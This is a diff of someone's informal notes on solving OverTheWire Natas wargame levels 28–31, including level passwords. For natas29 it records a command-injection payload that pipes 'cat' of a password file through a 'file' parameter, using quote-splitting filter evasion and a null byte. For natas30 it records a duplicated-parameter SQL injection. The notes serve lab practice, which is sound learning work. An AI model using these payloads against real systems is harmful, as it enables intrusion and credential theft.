@@ -774,3 +774,44 @@ I tried all. It did not work.
 
 I read a walkthrough. It was close, but not enough.
 MEH.
+
+13.7.26 13:58
+I tried watching a walkthrough, the Indian dude wasn't vert clear. Ill read this instead [OverTheWire Natas Level 28 Walkthrough](https://learnhacking.io/overthewire-natas-level-28-walkthrough/)
+I understand it 50%.
+
+###### natas29
+natas29
+hwgoYUiGWoSZAqphtCAZf7u1jS16KEah
+I am trying to do command injection on the get request. No success so far.
+I got some kinda of a hit!.
+
+payload:
+| type %SYSTEMROOT%\repair\SYSTEM
+
+response:
+%SYSTEMROOT%repairSYSTEM.txt: not found
+
+Thats a vector!
+
+the pipe was good. it was a null byte. fucking hell.
+[natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na""tas_webpass/na""tas30%00](http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/na%22%22tas_webpass/na%22%22tas30%00)
+
+|cat%20index.pl%00
+
+frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF
+
+###### natas30
+natas30
+frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF
+
+After reading online, I understood that pram was vulnerable.
+username=natas31&password='lol' or 1&password=4
+
+4 is an sql number. I am not in the mood to explain more than that.
+
+aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
+
+###### natas31
+natas31
+aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
+
